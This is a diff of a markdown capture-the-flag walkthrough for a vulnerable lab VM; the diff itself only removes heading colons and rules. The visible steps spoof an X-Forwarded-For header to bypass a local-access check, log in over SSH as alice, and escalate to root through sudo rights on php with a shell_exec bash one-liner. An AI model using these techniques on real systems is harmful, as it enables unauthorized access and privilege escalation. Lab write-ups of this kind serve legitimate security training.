@@ -5,9 +5,8 @@
 - [Enumeration](#enumeration)
 - [Penetration](#penetration)
 - [Privilege Escelation](#privilege-escelation)
----
 
-## Enumeration: 
+## Enumeration 
 - VM IP: `sudo netdiscover`
 
 	* `VMWare 192.168.0.14`
@@ -27,9 +26,8 @@
 	  http://192.168.0.14/config/config.php
 	  http://192.168.0.14/heyhoo.txt
 	  </pre>
----
 
-## Penetration:
+## Penetration
 - *index.php* requires local machine access
 - Header capture/info with **Fiddler**
 - Customize header with a browser extension(simply add `X-Forwarded-For: 0.0.0.0`)
@@ -50,9 +48,8 @@
 	  </pre>
 - `ssh 192.168.1.13 -l alice`
 - Login in and capture **first flag**
----
 		  
-## Privilege Escelation:
+## Privilege Escelation
 - `sudo -l`
 	* alice has root access on /usr/bin/php
 - `sudo php -r 'shell_exec("sudo /bin/bash -i 1>&0");'`
